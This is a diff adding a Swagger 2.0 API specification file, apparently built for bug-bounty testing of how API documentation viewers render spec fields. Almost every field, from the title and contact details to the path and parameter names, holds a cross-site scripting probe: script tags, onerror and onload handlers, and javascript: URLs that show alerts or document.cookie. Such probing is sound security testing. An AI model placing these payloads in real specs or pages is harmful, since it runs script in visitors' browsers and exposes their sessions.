@@ -1,0 +1,39 @@
+{
+  "swagger": "2.0",
+  "info": {
+    "title": "\"><script>alert(document.cookie)</script>",
+    "description": "XSS test: <img src=x onerror=alert(document.cookie)>",
+    "contact": {
+      "name": "\"><svg onload=alert(1)>",
+      "email": "giongfnef26@intigriti.me\"><script>alert(1)</script>",
+      "url": "javascript:alert(1)"
+    },
+    "license": {
+      "name": "MIT\"><body onload=alert(1)>",
+      "url": "javascript:alert('XSS')"
+    },
+    "version": "1.0\"><script>alert(1)</script>"
+  },
+  "host": "example.com\"><script>alert(1)</script>",
+  "basePath": "/api\"><img src=x onerror=alert(1)>",
+  "schemes": [
+    "https\"><script>alert(1)</script>"
+  ],
+  "paths": {
+    "/test\": {\"><script>alert(1)</script>\"": {
+      "get": {
+        "summary": "Test endpoint\"><img src=x onerror=alert(1)>",
+        "description": "XSS test: <script>alert(document.cookie)</script>",
+        "parameters": [
+          {
+            "name": "test\"><script>alert(1)</script>",
+            "in": "query",
+            "description": "test param\"><svg onload=alert(1)>",
+            "type": "string",
+            "default": "\"><script>alert(1)</script>"
+          }
+        ]
+      }
+    }
+  }
+}
